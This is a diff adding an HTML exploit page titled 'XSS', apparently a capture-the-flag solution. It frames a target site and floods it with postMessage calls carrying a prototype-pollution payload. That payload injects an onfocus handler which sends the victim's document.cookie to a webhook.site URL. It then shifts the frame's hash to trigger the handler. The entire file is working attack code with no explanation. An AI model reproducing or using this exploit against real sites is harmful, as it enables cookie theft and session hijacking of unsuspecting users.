@@ -1,0 +1,40 @@
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>XSS</title>
+  </head>
+  <body>
+    <div>
+      <iframe id="f1" name=f src="https://small-talk.coach:1337" width="500" height="700" onload="run()"></iframe>
+    </div>
+    <script>
+      console.log('loaded')
+      let count = 0
+      send()
+
+      function send() {
+        f.postMessage(JSON.stringify({
+            '__proto__.reference': {
+              'onfocus': 'location="https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449?c="+document.cookie'
+            },
+            message: '456'
+        }), '*')
+        requestAnimationFrame(() => {
+          if (count++ < 40) {
+            send()
+          } else {
+            setTimeout(() => {
+              f1.src = "https://small-talk.coach:1337#quote";
+              f1.src = "https://small-talk.coach:1337#send-button"
+            }, 0)
+          }
+        })
+      }
+
+      function run() {
+        console.log('iframe loaded')
+      }
+ 
+    </script>
+  </body>
+</html>
